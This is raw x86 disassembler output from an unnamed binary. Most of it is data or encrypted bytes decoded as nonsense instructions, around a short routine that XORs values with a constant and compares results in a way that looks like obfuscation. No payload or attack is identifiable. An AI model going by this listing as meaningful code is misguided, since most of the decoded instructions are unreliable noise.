  41c811:	shl    DWORD PTR [esi-0x56],cl
  41c814:	fwait
  41c815:	test   al,0x12
  41c817:	fmul   QWORD PTR [eax-0x65]
  41c81a:	push   ecx
  41c81b:	sbb    BYTE PTR [ecx-0x2e4a16f8],cl
  41c821:	and    al,0x98
  41c823:	imul   ecx,DWORD PTR [ebp+0x7a],0x28938919
  41c82a:	inc    edi
  41c82b:	jle    0x41c84f
  41c82d:	rol    DWORD PTR [ebp-0x54],1
  41c830:	push   ebp
  41c831:	xchg   esp,eax
  41c832:	cs aam 0x4d
  41c835:	sbb    eax,0xea7c69fb
  41c83a:	inc    ebx
  41c83b:	add    ah,al
  41c83d:	shl    DWORD PTR [ebp+ebp*2+0x63],cl
  41c841:	jmp    0xa54fb107
  41c846:	sbb    DWORD PTR [ebp-0x26],esi
  41c849:	sub    ch,0xc9
  41c84c:	or     DWORD PTR [ebx-0xdf10ea9],edi
  41c852:	pop    edi
  41c853:	push   edi
  41c854:	sti    
  41c855:	jno    0x41c863
  41c857:	adc    ebx,DWORD PTR [eax+0x69]
  41c85a:	fwait
  41c85b:	adc    eax,0x1ebf7556
  41c860:	aas    
  41c861:	mul    al
  41c863:	stos   DWORD PTR es:[edi],eax
  41c864:	(bad)  
  41c865:	mov    al,ds:0xf9aca9f3
  41c86a:	xchg   DWORD PTR [ebx-0x63d0c858],edi
  41c870:	cmp    eax,0x30f5add6
  41c875:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c876:	jmp    0xf7cee434
  41c87b:	pop    eax
  41c87c:	cmp    eax,0xde5c6c20
  41c881:	cdq    
  41c882:	jno    0x41c87a
  41c884:	adc    dl,BYTE PTR [edx+0x74ffd0fe]
  41c88a:	and    al,0x74
  41c88c:	push   DWORD PTR [esp+0x74]
  41c890:	push   DWORD PTR [esp+0x24]
  41c894:	push   DWORD PTR [esp+0x24]
  41c898:	call   0x415a06
  41c89d:	mov    edx,DWORD PTR [esp+0x18]
  41c8a1:	mov    eax,DWORD PTR [esp+0x1c]
  41c8a5:	mov    ecx,DWORD PTR [esp+0x18]
  41c8a9:	mov    edi,DWORD PTR [esp+0x1c]
  41c8ad:	shrd   edx,eax,0x2
  41c8b1:	shr    eax,0x2
  41c8b4:	shl    ecx,0x1e
  41c8b7:	xor    ecx,ecx
  41c8b9:	mov    eax,0x329e695d
  41c8be:	xor    edx,eax
  41c8c0:	or     ecx,edx
  41c8c2:	mov    edx,DWORD PTR [esp+0x5c]
  41c8c6:	mov    DWORD PTR [edx],ecx
  41c8c8:	mov    ecx,DWORD PTR [esp+0x18]
  41c8cc:	mov    edx,DWORD PTR [esp+0x1c]
  41c8d0:	shrd   ecx,edx,0x2
  41c8d4:	xor    ecx,eax
  41c8d6:	mov    eax,DWORD PTR [esp+0x18]
  41c8da:	shl    eax,0x1e
  41c8dd:	shr    edx,0x2
  41c8e0:	mov    edx,DWORD PTR [esp+0x1c]
  41c8e4:	xor    eax,eax
  41c8e6:	or     eax,ecx
  41c8e8:	mov    ecx,DWORD PTR [esp+0x68]
  41c8ec:	mov    DWORD PTR [ecx],eax
  41c8ee:	mov    eax,DWORD PTR [esp+0x68]
  41c8f2:	mov    ecx,DWORD PTR [esp+0x68]
  41c8f6:	mov    eax,DWORD PTR [eax]
  41c8f8:	cmp    eax,DWORD PTR [ecx]
  41c8fa:	jne    0x41d531
  41c900:	mov    eax,DWORD PTR [esp+0x5c]
  41c904:	mov    ecx,DWORD PTR [esp+0x5c]
  41c908:	mov    eax,DWORD PTR [eax]
  41c90a:	cmp    eax,DWORD PTR [ecx]
  41c90c:	jne    0x41d531
  41c912:	mov    BYTE PTR [esp+0x2c],0x20
  41c917:	mov    BYTE PTR [esp+0x38],0x3
  41c91c:	mov    BYTE PTR [esp+0x3c],0x6d
  41c921:	mov    BYTE PTR [esp+0x2b],0x90
  41c926:	mov    al,BYTE PTR [esp+0x2b]
  41c92a:	jmp    0x41ccf9
  41c92f:	push   ebp
  41c930:	and    al,0x97
  41c932:	shl    DWORD PTR [esi-0x5e],cl
  41c935:	push   ebp
  41c936:	and    dh,ch
  41c938:	jmp    DWORD PTR [ebx-0x44]
  41c93b:	sti    
  41c93c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c93d:	xchg   ecx,eax
  41c93e:	jo     0x41c92f
  41c940:	imul   edx,DWORD PTR [esi],0x18
  41c943:	mov    esp,0xf7181812
  41c948:	sub    eax,esi
  41c94a:	cs mov al,0x7c
  41c94d:	xchg   esi,eax
  41c94e:	dec    ecx
  41c94f:	and    al,BYTE PTR [edx+ecx*4]
  41c952:	mov    edx,0xa324fd9d
  41c957:	xchg   esp,eax
  41c958:	pop    eax
  41c959:	or     eax,0xfb8d0aa1
  41c95e:	push   0xffffff83
  41c960:	scas   al,BYTE PTR es:[edi]
  41c961:	into   
  41c962:	outs   dx,DWORD PTR ds:[esi]
  41c963:	pop    es
  41c964:	pop    edx
  41c965:	fwait
  41c966:	and    edx,DWORD PTR [edi-0x6c7c10c0]
  41c96c:	fcmovne st,st(4)
  41c96e:	xor    bl,ch
  41c970:	cwde   
  41c971:	shl    esi,cl
  41c973:	push   cs
  41c974:	adc    edi,0xffffffdc
  41c977:	enter  0x7b34,0xe9
  41c97b:	fadd   st,st(2)
  41c97d:	stos   DWORD PTR es:[edi],eax
  41c97e:	data16 and al,0xc8
  41c981:	ret    0xe7b
  41c984:	sbb    al,0xa7
  41c986:	int    0x2c
  41c988:	pusha  
  41c989:	stos   DWORD PTR es:[edi],eax
  41c98a:	test   DWORD PTR [ebx-0x681debaf],0xdf464f4d
  41c994:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c995:	push   ss
  41c996:	retf   0x77fe
  41c999:	jle    0x41c948
  41c99b:	in     eax,0x72
  41c99d:	ja     0x41c9c4
  41c99f:	xor    eax,0xcabba0d7
  41c9a4:	mov    ebx,0xff3f621a
  41c9a9:	std    
  41c9aa:	aam    0x49
  41c9ac:	scas   al,BYTE PTR es:[edi]
  41c9ad:	gs push edi
  41c9af:	out    0xde,al
  41c9b1:	pop    ecx
  41c9b2:	loope  0x41c9a2
  41c9b4:	fbld   TBYTE PTR ds:0x81395403
  41c9ba:	fiadd  WORD PTR [edi+ebp*1]
  41c9bd:	cli    
  41c9be:	dec    esi
  41c9bf:	neg    DWORD PTR [edx+edi*1+0x59ae0954]
  41c9c6:	xchg   ecx,eax
  41c9c7:	cmp    ah,dl
  41c9c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c9ca:	ret    
  41c9cb:	into   
  41c9cc:	fisub  WORD PTR [ebp-0x1]
  41c9cf:	and    eax,0x21cc1fd
  41c9d4:	adc    al,0x40
  41c9d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c9d7:	(bad)  
  41c9d8:	mov    ?,WORD PTR [ebx+0x7b]
  41c9db:	arpl   WORD PTR [ecx],ax
  41c9dd:	rcl    BYTE PTR [edi],0x3
  41c9e0:	(bad)  
  41c9e2:	rcl    BYTE PTR [ebp-0x19],0x35
  41c9e6:	mov    al,ds:0x7aa4e7f8
  41c9eb:	push   esi
  41c9ec:	pop    esp
  41c9ed:	mov    fs,WORD PTR [esi-0x41]
  41c9f0:	dec    ebp
  41c9f1:	popa   
  41c9f2:	pop    eax
  41c9f3:	cmp    ecx,DWORD PTR [eax+0x9]
  41c9f6:	add    BYTE PTR [edi],ah
  41c9f8:	stos   BYTE PTR es:[edi],al
  41c9f9:	repz pop ebp
  41c9fb:	and    ecx,DWORD PTR [edx+0x11]
  41c9fe:	fmul   QWORD PTR [esi-0x417c0435]
  41ca04:	mov    cl,BYTE PTR [eax-0x6fa5121a]
  41ca0a:	ret    
  41ca0b:	xor    bh,BYTE PTR [esi-0x10]
  41ca0e:	fdivr  DWORD PTR [edi]
  41ca10:	nop
  41ca11:	jg     0x41c9c4
  41ca13:	jb     0x41c9a1
  41ca15:	retf   0xa2f4
  41ca18:	sahf   
  41ca19:	test   eax,0x432dd0c1
  41ca1e:	add    dl,BYTE PTR [ecx]
  41ca20:	int    0x96
  41ca22:	jle    0x41ca72
  41ca24:	push   es
  41ca25:	clc    
  41ca26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca27:	inc    edi
  41ca28:	daa    
  41ca29:	and    DWORD PTR [eax],edx
  41ca2b:	and    esp,DWORD PTR [ebx-0x22f3cc96]
  41ca31:	cmp    eax,0x6486bca0
  41ca36:	ins    DWORD PTR es:[edi],dx
  41ca37:	rol    DWORD PTR [esi-0x36834e8d],cl
  41ca3d:	pop    ds
  41ca3e:	add    ebp,DWORD PTR [ecx+0x44d2d63a]
  41ca44:	dec    esp
  41ca45:	or     al,0xd7
  41ca47:	xchg   BYTE PTR [eax-0x1b69a9e5],dh
  41ca4d:	inc    esp
  41ca4e:	inc    edi
  41ca4f:	push   ebx
  41ca50:	popa   
  41ca51:	ins    BYTE PTR es:[edi],dx
  41ca52:	js     0x41ca19
  41ca54:	les    ebp,FWORD PTR [eax*8+0x19b5e2dd]
  41ca5b:	push   ss
  41ca5c:	nop
  41ca5d:	call   0xc0f:0xbfdb297a
  41ca64:	xchg   esp,eax
  41ca65:	call   0xd898:0x3d60388f
  41ca6c:	push   ss
  41ca6d:	sub    al,0x80
  41ca6f:	call   0x764:0xe978c6a2
  41ca76:	sub    eax,0x716a64c4
  41ca7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ca7c:	add    DWORD PTR [eax+eiz*8+0x7bf31e0a],edi
  41ca83:	lahf   
  41ca84:	pop    edi
  41ca85:	jmp    0x41ca7d
  41ca87:	shr    BYTE PTR [esp+ebx*2],cl
  41ca8a:	cmp    BYTE PTR [edx+0x35],ah
  41ca8d:	inc    edx
  41ca8e:	inc    edx
  41ca8f:	mov    eax,0xb2ea9dd6
  41ca94:	sbb    al,0xb8
  41ca96:	sbb    eax,0x35917f16
  41ca9b:	call   0xfa31e189
  41caa0:	inc    eax
  41caa1:	add    DWORD PTR [edx+0x3780e803],ebx
  41caa7:	pop    ecx
  41caa8:	pop    esp
  41caa9:	test   BYTE PTR [ebp+0x414afee6],bl
  41caaf:	test   eax,0x11a09afa
  41cab4:	outs   dx,BYTE PTR ds:[esi]
  41cab5:	jne    0x41caf7
  41cab7:	mov    eax,0x1c47a501
  41cabc:	xor    ebp,DWORD PTR [ebp-0x29]
  41cabf:	out    0x9d,al
  41cac1:	sub    edx,edi
  41cac3:	push   esi
  41cac4:	xor    al,0xa6
  41cac6:	lods   al,BYTE PTR ds:[esi]
  41cac7:	in     al,dx
  41cac8:	arpl   WORD PTR ds:0x9528e492,sp
  41cace:	and    al,0xb7
  41cad0:	lods   al,BYTE PTR ds:[esi]
  41cad1:	mov    bh,0xbf
  41cad3:	mov    bh,0x96
  41cad5:	popa   
  41cad6:	mov    ds:0xb5ea7ea5,al
  41cadb:	mov    edx,0xba17f3
  41cae0:	out    0x77,al
  41cae2:	or     cl,BYTE PTR [edi+0x4f2ce6ba]
  41cae8:	cwde   
  41cae9:	mov    BYTE PTR [ebx],cl
  41caeb:	inc    ecx
  41caec:	jmp    0x83d53d96
  41caf1:	mov    esi,0x2b34c197
  41caf6:	loopne 0x41cac6
  41caf8:	cmp    al,0x69
  41cafa:	mov    edi,DWORD PTR [ecx+0x10]
  41cafd:	jmp    0x2ed1:0xacb709d4
  41cb04:	pop    edi
  41cb05:	test   al,0xbc
  41cb07:	sub    ah,BYTE PTR [eax-0x26]
  41cb0a:	jbe    0x41cb1c
  41cb0c:	in     eax,0x5b
  41cb0e:	shl    bh,cl
  41cb10:	mov    dl,0x75
  41cb12:	dec    edx
  41cb13:	leave  
  41cb14:	mov    ecx,0xb0eecc45
  41cb19:	mov    bh,dh
  41cb1b:	xchg   ebp,eax
  41cb1c:	or     eax,DWORD PTR [ecx-0xa]
  41cb1f:	dec    esi
  41cb20:	cwde   
  41cb21:	hlt    
  41cb22:	sbb    DWORD PTR [ecx+0x12],0x5c
  41cb26:	(bad)  
  41cb27:	jle    0x41caf7
  41cb29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb2a:	pop    ecx
  41cb2b:	imul   ebx,DWORD PTR [esi-0xe],0x456ddeb
  41cb32:	jmp    0x1a7a:0x6b222e24
  41cb39:	inc    edx
  41cb3a:	jge    0x41cb53
  41cb3c:	xor    BYTE PTR [edx+0x4e],dh
  41cb3f:	sbb    edx,DWORD PTR [eax+esi*8]
  41cb42:	add    BYTE PTR [esi+0x48710fe3],ah
  41cb48:	mov    edi,0x5148448a
  41cb4d:	cmp    DWORD PTR [ebx-0x2e],ebx
  41cb50:	jp     0x41cbca
  41cb52:	out    dx,eax
  41cb53:	js     0x41cb1a
  41cb55:	pop    ebx
  41cb56:	adc    DWORD PTR [ebx],ebx
  41cb58:	lods   al,BYTE PTR ds:[esi]
  41cb59:	clc    
  41cb5a:	sub    bh,BYTE PTR [ebp+0x46d3372b]
  41cb60:	test   BYTE PTR [esi-0x56403aad],dh
  41cb66:	aaa    
  41cb67:	(bad)  
  41cb68:	dec    ebx
  41cb69:	or     dh,0x77
  41cb6c:	xchg   esi,eax
  41cb6d:	repnz push eax
  41cb6f:	mov    ebp,eax
  41cb71:	adc    BYTE PTR ds:0x57b74de9,bl
  41cb77:	ficomp WORD PTR [ecx]
  41cb79:	lock jb 0x41cb5a
  41cb7c:	lea    esi,[eax+0x62def5c1]
  41cb82:	(bad)  
  41cb83:	sub    edi,0x16bedd30
  41cb89:	and    ah,BYTE PTR [edx+0x0]
  41cb8c:	xchg   edx,eax
  41cb8d:	sbb    edi,DWORD PTR [edx]
  41cb8f:	dec    edx
  41cb90:	xchg   esi,eax
  41cb91:	cli    
  41cb92:	or     WORD PTR [ebp-0x129448e6],cx
  41cb99:	call   0xfb62:0x5959e584
  41cba0:	dec    edx
  41cba1:	int    0x15
  41cba3:	xor    al,0xa
  41cba5:	jge    0x41cc0d
  41cba7:	pop    edi
  41cba8:	sti    
  41cba9:	ror    dh,1
  41cbab:	in     eax,0xc
  41cbad:	xchg   ebx,eax
  41cbae:	mov    WORD PTR [esi+0x3ea9243d],?
  41cbb4:	add    al,BYTE PTR [ebx+0x6b001c1c]
  41cbba:	xor    BYTE PTR [ebp+0xa],0xff
  41cbbe:	xchg   edi,eax
  41cbbf:	mov    cl,0x71
  41cbc1:	mov    dh,0xb8
  41cbc3:	fnstcw WORD PTR [ebp-0x44723d86]
  41cbc9:	call   0x2e5c:0x9d8fef39
  41cbd0:	xor    esp,ecx
  41cbd2:	not    ch
  41cbd4:	xor    DWORD PTR [eax+0x139b299e],edi
  41cbda:	pop    edx
  41cbdb:	push   eax
  41cbdc:	fnclex 
  41cbde:	sbb    al,0x44
  41cbe0:	push   es
  41cbe1:	call   0x63e4:0xed0b265f
  41cbe8:	lock std 
  41cbea:	inc    ebp
  41cbeb:	and    al,0xc3
  41cbed:	lods   eax,DWORD PTR ds:[esi]
  41cbee:	mov    al,ds:0x870c369f
  41cbf3:	out    dx,al
  41cbf4:	jnp    0x41cc00
  41cbf6:	in     eax,0x55
  41cbf8:	jmp    0x7c22:0xe8a2e9a
  41cbff:	xlat   BYTE PTR ds:[ebx]
  41cc00:	pop    edi
  41cc01:	hlt    
  41cc02:	dec    eax
  41cc03:	xchg   ebx,eax
  41cc04:	dec    ecx
  41cc05:	lea    edi,[edi+0x44387170]
  41cc0b:	jae    0x41cbbb
  41cc0d:	jne    0x41cc59
  41cc0f:	aas    
  41cc10:	cmp    eax,0xd1006593
  41cc15:	leave  
  41cc16:	rcr    BYTE PTR [esi-0x181e6dca],cl
  41cc1c:	pop    ds
  41cc1d:	jne    0x41cc9b
  41cc1f:	icebp  
  41cc20:	std    
  41cc21:	sbb    esi,DWORD PTR [ebx-0x4e37ddf3]
  41cc27:	pop    ds
  41cc28:	sti    
  41cc29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc2a:	js     0x41cc3f
  41cc2c:	std    
  41cc2d:	(bad)  
  41cc2e:	popa   
  41cc2f:	add    eax,0xbe335cef
  41cc34:	scas   al,BYTE PTR es:[edi]
  41cc35:	cmp    DWORD PTR [eax],0x2d
  41cc38:	(bad)  
  41cc3a:	nop
  41cc3b:	std    
  41cc3c:	xor    eax,0x316a8529
  41cc41:	push   edx
  41cc42:	mov    WORD PTR [ebx-0x9],?
  41cc45:	push   0xffffffa1
  41cc47:	mov    eax,0x60b80c9a
  41cc4c:	pop    esp
  41cc4d:	pop    edi
  41cc4e:	jb     0x41cc46
  41cc50:	mov    bh,0x9f
  41cc52:	pop    ds
  41cc53:	push   ecx
  41cc54:	mov    ds:0x2b48f87a,al
  41cc59:	mov    ah,0x92
  41cc5b:	in     eax,dx
  41cc5c:	add    al,0xdb
  41cc5e:	sbb    eax,0x837a2f22
  41cc63:	sbb    al,0x5c
  41cc65:	jmp    0xa83c:0x32e020dc
  41cc6c:	dec    edi
  41cc6d:	ss pusha 
  41cc6f:	adc    DWORD PTR [ebp+edx*1+0x7a3e7faa],eax
  41cc76:	inc    esp
  41cc77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc78:	mov    dl,0xc
  41cc7a:	shl    BYTE PTR [eax-0x426d4ff],0xba
  41cc81:	mov    BYTE PTR [ebx],bh
  41cc83:	popf   
  41cc84:	cmp    edi,DWORD PTR [edi-0xf]
  41cc87:	inc    ecx
  41cc88:	jnp    0x41cca8
  41cc8a:	js     0x41ccd2
  41cc8c:	xchg   ebp,eax
  41cc8d:	(bad)  [edx+0x3db9d81b]
  41cc93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cc94:	adc    DWORD PTR [esi+0x1d],edx
  41cc97:	adc    DWORD PTR [ecx],ebx
  41cc99:	and    eax,esi
  41cc9b:	xchg   edi,eax
  41cc9c:	sub    ecx,DWORD PTR [ecx-0x1848d6da]
  41cca2:	retf   
  41cca3:	mov    edx,0xf1d3ab75
  41cca8:	arpl   WORD PTR [eax+0x2ebbcf03],dx
  41ccae:	jge    0x41cc4d
  41ccb0:	fs dec edx
  41ccb2:	jle    0x41cc94
  41ccb4:	or     DWORD PTR [eax-0x26],ecx
  41ccb7:	mov    ecx,0x37baa1b3
  41ccbc:	repnz imul esp,esp,0xffffff96
  41ccc0:	mov    al,0x97
  41ccc2:	push   esi
  41ccc3:	cmp    BYTE PTR [ecx+0x77],ah
  41ccc6:	push   eax
  41ccc7:	test   eax,0xef9a0685
  41cccc:	mov    ebp,0x61757d1
  41ccd1:	cmp    esp,edi
  41ccd3:	out    0xb9,al
  41ccd5:	or     esi,DWORD PTR [eax]
  41ccd7:	adc    BYTE PTR [edx+0x2910a03d],cl
  41ccdd:	xchg   esp,eax
  41ccde:	call   0x92bb:0xd1df836c
  41cce5:	and    BYTE PTR [ecx],ah
  41cce7:	cdq    
  41cce8:	sub    edx,DWORD PTR [esi+0x3229c607]
  41ccee:	xor    dh,BYTE PTR [edx+0x4b]
  41ccf1:	sbb    eax,0x8cec0889
  41ccf6:	cmp    esi,DWORD PTR [esi]
  41ccf8:	jo     0x41cc84
  41ccfa:	dec    esp
  41ccfb:	and    al,0x3c
  41ccfd:	or     al,0xdc
  41ccff:	jmp    0x41d0ce
  41cd04:	fimul  WORD PTR [esi+0x16]
  41cd07:	jle    0x41cd30
  41cd09:	ds pop esi
  41cd0b:	cs je  0x41cd75
  41cd0e:	xchg   edi,eax
  41cd0f:	mov    esp,0xaa533c1d
  41cd14:	xchg   ebx,eax
  41cd15:	arpl   WORD PTR [esi],dx
  41cd17:	sbb    BYTE PTR [edx+edx*1-0x348ee7e8],bh
  41cd1e:	pop    es
  41cd1f:	daa    
  41cd20:	sub    eax,0xaeef228
  41cd25:	cmp    BYTE PTR [eax],ch
  41cd27:	(bad)  
  41cd28:	xchg   esp,eax
  41cd29:	xchg   ebx,eax
  41cd2a:	jmp    0xd125:0xc810bbdb
  41cd31:	lds    esi,FWORD PTR [ebp-0x1eeeebf9]
  41cd37:	test   BYTE PTR [edx+0x768cb8c0],dl
  41cd3d:	push   edx
  41cd3e:	inc    esi
  41cd3f:	neg    BYTE PTR [edi+0x7f944d3a]
  41cd45:	lods   al,BYTE PTR ds:[esi]
  41cd46:	enter  0x9c23,0x57
  41cd4a:	jnp    0x41cd7f
  41cd4c:	jbe    0x41cd02
  41cd4e:	inc    ecx
  41cd4f:	ficom  WORD PTR ds:0x9877b2aa
  41cd55:	stos   DWORD PTR es:[edi],eax
  41cd56:	in     al,0x2d
  41cd58:	pop    es
  41cd59:	fsubr  QWORD PTR [eax-0x55]
  41cd5c:	jmp    0xabf:0x1768ab29
  41cd63:	cmc    
  41cd64:	cmp    al,0xd0
  41cd66:	(bad)  
  41cd67:	lock sahf 
  41cd69:	out    dx,eax
  41cd6a:	shl    DWORD PTR [ebx-0x3f8ce849],cl
  41cd70:	mov    dl,0x8e
  41cd72:	das    
  41cd73:	jmp    0x3159ca08
  41cd78:	scas   eax,DWORD PTR es:[edi]
  41cd79:	xor    edx,ebp
  41cd7b:	mov    ebx,0x43d46526
  41cd80:	mov    ebp,0xb7f2b1d2
  41cd85:	imul   esi,esp,0xffffff98
  41cd88:	sbb    al,0x11
  41cd8a:	in     eax,0x80
  41cd8c:	and    eax,0x333dd9bb
  41cd91:	pusha  
  41cd92:	jbe    0x41ce0a
  41cd94:	jmp    0x551c633a
  41cd99:	sbb    DWORD PTR [ecx-0x7d],ecx
  41cd9c:	lock mov ebp,0xf124077
  41cda2:	ja     0x41cd6a
  41cda4:	retf   
  41cda5:	into   
  41cda6:	test   al,0x6d
  41cda8:	add    DWORD PTR [ecx+0x1957f1d8],eax
  41cdae:	push   ebx
  41cdaf:	or     ch,BYTE PTR [ebx+edx*1+0x70e0053e]
  41cdb6:	dec    ecx
  41cdb7:	jle    0x41cd52
  41cdb9:	imul   BYTE PTR [ebp-0x6fc7d4cc]
  41cdbf:	mov    bl,0xce
  41cdc1:	sub    edi,DWORD PTR [eax]
  41cdc3:	mov    ch,0x77
  41cdc5:	dec    esi
  41cdc6:	outs   dx,BYTE PTR ds:[esi]
  41cdc7:	add    DWORD PTR [ebp+0x2b075ccb],0x9ad7686b
  41cdd1:	xor    DWORD PTR [ebp-0x2b],0x26a667b
  41cdd8:	hlt    
  41cdd9:	gs lock sahf 
  41cddc:	call   0x9ba4:0xc781af8b
  41cde3:	outs   dx,DWORD PTR ds:[esi]
  41cde4:	fist   DWORD PTR [ebx+0x6f]
  41cde7:	jmp    0x41ce17
  41cde9:	mov    al,0x3
  41cdeb:	cld    
  41cdec:	test   ebx,eax
  41cdee:	mov    WORD PTR [edi],es
  41cdf0:	pop    eax
  41cdf1:	fstp   DWORD PTR [edi-0x577eb56f]
  41cdf7:	imul   ebp,DWORD PTR [ebp+0x6d1bc35],0xffffffd8
  41cdfe:	addr16 jp 0x41ce7a
  41ce01:	dec    ebp
  41ce02:	sar    BYTE PTR [ecx-0x7e5b4ab2],cl
  41ce08:	dec    edi
  41ce09:	inc    ebx
  41ce0a:	mov    cl,0x94
  41ce0c:	sbb    BYTE PTR [ebx+0x4ee1e2c6],dh
  41ce12:	retf   0x9c37
  41ce15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce16:	cmp    BYTE PTR [ecx],dh
  41ce18:	or     BYTE PTR [edi],cl
  41ce1a:	nop
  41ce1b:	mov    dl,0x2c
  41ce1d:	pop    ss
  41ce1e:	pop    edx
  41ce1f:	mov    bl,0x89
  41ce21:	jae    0x41cdac
  41ce23:	pop    ebp
  41ce24:	pushf  
  41ce25:	inc    ebx
  41ce26:	mov    eax,ds:0x876c0ef1
  41ce2b:	xchg   edx,eax
  41ce2c:	lea    ebx,[eax+esi*1-0x7f866e45]
  41ce33:	sbb    BYTE PTR [ebx+0x63],ch
  41ce36:	scas   eax,DWORD PTR es:[edi]
  41ce37:	aas    
  41ce38:	in     al,0x5b
  41ce3a:	(bad)  
  41ce3b:	cmp    dl,cl
  41ce3d:	dec    esi
  41ce3e:	cdq    
  41ce3f:	jecxz  0x41cebd
  41ce41:	lds    esp,FWORD PTR [edi]
  41ce43:	add    esi,DWORD PTR [edx]
  41ce45:	mov    dh,0xb2
  41ce47:	xlat   BYTE PTR ds:[ebx]
  41ce48:	adc    DWORD PTR [edi+0x5a6f556c],ecx
  41ce4e:	int    0x95
  41ce50:	mov    eax,ds:0xe909b465
  41ce55:	test   eax,edx
  41ce57:	pop    ds
  41ce58:	dec    esp
  41ce59:	or     eax,0x90f057df
  41ce5e:	xor    BYTE PTR [esi+esi*2-0x57e5fd37],cl
  41ce65:	mov    cs,WORD PTR [ebx-0x43]
  41ce68:	lds    edi,FWORD PTR [ebp-0xd4423f1]
  41ce6e:	push   cs
  41ce6f:	rcr    dl,1
  41ce71:	sbb    BYTE PTR [edx-0x64],cl
  41ce74:	add    al,0x19
  41ce76:	adc    al,0x8a
  41ce78:	jno    0x41ce2e
  41ce7a:	lds    eax,FWORD PTR [ebx-0x480e4d29]
  41ce80:	fld    DWORD PTR [eax-0x45]
  41ce83:	bound  eax,QWORD PTR ds:0xca28fae7
  41ce89:	loope  0x41ce6b
  41ce8b:	ret    
  41ce8c:	(bad)  
  41ce8d:	fnsave [edi+0x37]
  41ce90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce91:	(bad)  
  41ce92:	jo     0x41ce43
  41ce94:	push   ds
  41ce95:	sbb    esi,ebx
  41ce97:	hlt    
  41ce98:	push   ebp
  41ce99:	jo     0x41cef1
  41ce9b:	ins    BYTE PTR es:[edi],dx
  41ce9c:	dec    esp
  41ce9d:	sbb    dh,BYTE PTR [ebx-0x34]
  41cea0:	(bad)  
  41cea1:	fsubr  QWORD PTR [ecx]
  41cea3:	mov    bh,ah
  41cea5:	mov    ebx,0x4cc139cd
  41ceaa:	(bad)  
  41ceab:	mov    al,0x46
  41cead:	mov    edx,0xc62e2913
  41ceb2:	adc    edi,ebp
  41ceb4:	dec    esp
  41ceb5:	outs   dx,BYTE PTR ds:[esi]
  41ceb6:	adc    ecx,edx
  41ceb8:	add    eax,0xcceea49
  41cebd:	inc    esi
  41cebe:	or     BYTE PTR [esi],0x9b
  41cec1:	mov    bh,0xd3
  41cec3:	jg     0x41ceb3
  41cec5:	jmp    0x41ceeb
  41cec7:	cwde   
  41cec8:	mov    ecx,0x195ac801
  41cecd:	jbe    0x41cf43
  41cecf:	mov    al,0xe0
  41ced1:	fstp   TBYTE PTR [ecx]
  41ced3:	inc    ebx
  41ced4:	mov    ds:0xc3bd2357,eax
  41ced9:	push   cs
  41ceda:	mov    ebx,DWORD PTR [eax-0x44]
  41cedd:	aas    
  41cede:	xor    eax,0x316f7fea
  41cee3:	inc    edx
  41cee4:	repnz cmp edi,eax
  41cee7:	add    BYTE PTR [ebx],0x30
  41ceea:	add    edx,DWORD PTR [edi+0x27]
  41ceed:	pop    eax
  41ceee:	push   edx
  41ceef:	xor    edi,edi
  41cef1:	pusha  
  41cef2:	cmp    BYTE PTR [ebp-0x62],dh
  41cef5:	mov    edx,0xfca444e3
  41cefa:	mov    BYTE PTR [edi-0x40],0x82
  41cefe:	add    BYTE PTR [edi+esi*2+0x31],bl
  41cf02:	out    0x8,eax
  41cf04:	xor    cl,BYTE PTR ds:0x416ce97f
  41cf0a:	mov    bh,0xd9
  41cf0c:	in     al,dx
  41cf0d:	sub    eax,0xd95bb92
  41cf12:	arpl   WORD PTR [edx+0x2c7e178f],di
  41cf18:	cwde   
  41cf19:	jge    0x41cf48
  41cf1b:	aad    0x45
  41cf1d:	loop   0x41cf7a
  41cf1f:	sub    ecx,DWORD PTR [ecx+0x22]
  41cf22:	or     al,0x38
  41cf24:	mov    dl,0x9d
  41cf26:	fbld   TBYTE PTR [ebx-0x27]
  41cf29:	in     eax,0x45
  41cf2b:	arpl   WORD PTR ds:0xd0d1455c,si
  41cf31:	add    al,0xf0
  41cf33:	or     al,0x5d
  41cf35:	jg     0x41ceec
  41cf37:	sbb    edx,edi
  41cf39:	xchg   ebx,eax
  41cf3a:	cmp    DWORD PTR [ecx+0x3142d640],edx
  41cf40:	xor    eax,0x948b1eed
  41cf45:	or     esi,edi
  41cf47:	xchg   ebp,eax
  41cf48:	cmp    dl,bh
  41cf4a:	push   esi
  41cf4b:	sbb    DWORD PTR [edi-0x20],ecx
  41cf4e:	push   eax
  41cf4f:	jecxz  0x41cf2a
  41cf51:	pushfw 
  41cf53:	xor    eax,0xc81029f8
  41cf58:	dec    edx
  41cf59:	imul   ebx,DWORD PTR [edx-0x1643cd6],0x5e
  41cf60:	xor    BYTE PTR [ecx+0x1a1f6e3a],dh
  41cf66:	mov    WORD PTR [eax],cs
  41cf68:	push   eax
  41cf69:	fwait
  41cf6a:	adc    BYTE PTR ds:0x47bd4c66,dl
  41cf70:	mov    esp,0x31fbea21
  41cf75:	fistp  QWORD PTR [ecx]
  41cf77:	pop    ss
  41cf78:	push   edx
  41cf79:	int    0xd5
  41cf7b:	ficomp DWORD PTR ds:0xf9218ab3
  41cf81:	pushf  
  41cf82:	dec    esp
  41cf83:	dec    ebx
  41cf84:	lods   eax,DWORD PTR ds:[esi]
  41cf85:	out    0x36,al
  41cf87:	(bad)  
  41cf88:	fstp   QWORD PTR [edx+0x7d14a16b]
  41cf8e:	xchg   ecx,eax
  41cf8f:	xor    DWORD PTR [ecx+0x51],eax
  41cf92:	and    al,0x17
  41cf94:	ins    DWORD PTR es:[edi],dx
  41cf95:	(bad)  
  41cf96:	xchg   ebx,eax
  41cf97:	leave  
  41cf98:	int    0x98
  41cf9a:	sahf   
  41cf9b:	outs   dx,BYTE PTR ds:[esi]
  41cf9c:	inc    ebp
  41cf9d:	jnp    0x41cf96
